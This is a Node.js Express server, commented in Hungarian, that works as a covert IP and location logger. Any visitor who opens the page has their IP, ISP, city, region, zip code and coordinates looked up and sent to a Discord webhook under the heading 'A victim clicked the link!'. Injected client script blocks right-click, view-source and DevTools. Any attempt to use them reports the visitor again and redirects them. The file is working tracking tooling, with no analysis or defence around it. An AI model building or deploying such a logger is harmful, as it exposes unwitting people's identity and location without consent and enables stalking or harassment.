const express = require('express');
const axios = require('axios');
require('dotenv').config();
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Statikus fájlok kiszolgálása (CSS, JS, stb.)
app.use(express.static(path.join(__dirname, 'public')));

// Webhook URL-ek a .env fájlból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;

// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
});

// /get-webhook-url útvonal a webhook URL-ek elküldéséhez
app.get('/get-webhook-url', (req, res) => {
    res.json({ webhookUrl, altWebhookUrl });
});

// /send-ip útvonal
app.get('/send-ip', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    try {
        // IP geolokáció lekérése ip-api használatával (API kulcs nélkül)
        const geoResponse = await axios.get(`http://ip-api.com/json/${userIp}`);
        const geoData = geoResponse.data;

        // Az API válaszból kiolvassuk a szükséges adatokat
        const [latitude, longitude] = (geoData.loc || '0,0').split(',');

        // A webhook üzenet elkészítése
        const message = {
            username: "Helyszíni Naplózó <3",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            content: `<@1095731086513930260>`,
            embeds: [{
                title: "Egy áldozat rákattintott a linkre!",
                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.zip || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                color: 0x800080
            }]
        };

        // Webhook küldés az alapértelmezett URL-re
        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});

// Frontend kód (JavaScript):
app.get('/script.js', (req, res) => {
    res.send(`
        let webhookUrl = "";
        let altWebhookUrl = "";
        let hasWarnedUser = false;

        window.onload = function () {
            // Webhook URL-ek lekérése
            fetch('/get-webhook-url')
                .then(res => res.json())
                .then(data => {
                    webhookUrl = data.webhookUrl;
                    altWebhookUrl = data.altWebhookUrl;
                });

            // IP lekérés indításkor
            fetch('/send-ip');

            // Figyelmeztetés egyszeri megjelenítése
            showWarningOnce();
        };

        function showWarningOnce() {
            if (hasWarnedUser) return;

            const overlay = document.getElementById('backgroundOverlay');
            const notification = document.getElementById('notification');

            overlay.style.display = 'block';
            notification.style.display = 'block';
            hasWarnedUser = true;

            setTimeout(() => {
                overlay.style.display = 'none';
                notification.style.display = 'none';
            }, 10000); // 10 másodperc
        }

        // Tiltott billentyűkombinációk blokkolása
        document.addEventListener('keydown', function (e) {
            const blockedCombos = [
                (e.ctrlKey && e.key === 's'),
                (e.ctrlKey && e.key === 'u'),
                (e.key === 'F12'),
                (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i'),
                (e.ctrlKey && e.key === 'p'),    // P is a forbidden key
                (e.ctrlKey && e.key === 'a')     // A is another forbidden key
            ];

            if (blockedCombos.some(Boolean)) {
                e.preventDefault();
                sendIpRequest(`Tiltott billentyű: ${e.key}`);
                window.location.href = 'https://cdn.discordapp.com/attachments/1165581521567105035/1400847670939222206/Messenger_creation_1054362723469051.jpg?ex=688e208f&is=688ccf0f&hm=29ab0c2ba9d2c19e9185b72037431fc7bbc2a27e399ab386403dcdfaefdeeba1&';  // Átirányítás másik oldalra
            }
        });

        // Jobb klikk blokkolás
        document.addEventListener('contextmenu', function (e) {
            e.preventDefault();
            sendIpRequest('Jobb klikk');
            window.location.href = 'https://cdn.discordapp.com/attachments/1165581521567105035/1400847670939222206/Messenger_creation_1054362723469051.jpg?ex=688e208f&is=688ccf0f&hm=29ab0c2ba9d2c19e9185b72037431fc7bbc2a27e399ab386403dcdfaefdeeba1&';  // Átirányítás másik oldalra
        });

        // IP küldés a Discordra
        function sendIpRequest(reason) {
            fetch('/send-ip')
                .then(res => res.json())
                .then(data => sendToWebhook(data.ip, reason));
        }

        function sendToWebhook(ip, reason) {
            const payload = {
                content: \`Tiltott művelet: \${reason} | IP: \${ip}\`
            };
            fetch(altWebhookUrl || webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // Másolás gomb logikája
        function copyKey() {
            const keyInput = document.getElementById('keyInput');
            keyInput.select();
            document.execCommand('copy');

            const msg = document.getElementById('notification');
            if (!hasWarnedUser) return; // csak akkor mutat, ha még nincs figyelmeztetés
            msg.innerText = 'A kulcs sikeresen kimásolva!';
            msg.style.display = 'block';
            setTimeout(() => msg.style.display = 'none', 2000);
        }

        // FIGYELEM: DevTools (F12, Ctrl+Shift+I) blokkolása, ha a devtools megnyílik
        let devToolsOpened = false;

        setInterval(function() {
            if (window.outerHeight - window.innerHeight > 100 || window.outerWidth - window.innerWidth > 100) {
                sendIpRequest('DevTools megnyitása');
                window.location.href = 'https://cdn.discordapp.com/attachments/1165581521567105035/1400847670939222206/Messenger_creation_1054362723469051.jpg?ex=688e208f&is=688ccf0f&hm=29ab0c2ba9d2c19e9185b72037431fc7bbc2a27e399ab386403dcdfaefdeeba1&'; // Átirányítás másik oldalra
            }
        }, 1000); // Minden 1 másodpercben ellenőrzi a változásokat
    `);
});

// Szerver indítása
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
